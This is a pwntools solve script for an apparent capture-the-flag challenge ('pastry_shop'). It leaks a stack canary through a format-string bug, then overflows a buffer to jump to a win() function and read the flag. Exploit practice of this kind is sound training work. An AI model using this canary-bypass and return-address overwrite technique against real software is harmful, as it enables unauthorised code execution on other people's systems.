#!/usr/bin/env python3
from pwn import *

# From checksec:
# Stack:      Canary found   =>  we should bypass the stack canary to exploit the buffer overflow vulnerability
# PIE:        No PIE (0x400000) =>  addresses are static and can be used directly in the exploit (e.g., win() function address)

elf = context.binary = ELF('./pastry_shop', checksec=False)

CANARY_IDX = 23
OFFSET_TO_CANARY = 72
OFFSET_TO_RIP = OFFSET_TO_CANARY + 8 + 8    # 8 bytes for the canary and 8 bytes for the saved RBP

p = remote("offsec.m0lecon.it", 13586)

p.recvuntil(b"What's your name, dear customer?\n")
p.sendline(f"%{CANARY_IDX}$lx".encode())
leak = p.recvline().strip()
canary = int(leak, 16)
log.info(f"canary = {canary:#x}")

p.recvuntil(b"And what would you like to order?\n")
payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),   # 8 bytes for the saved RBP
    p64(elf.sym.win),
)

p.send(payload)

p.sendline(b"cat flag")

p.interactive()
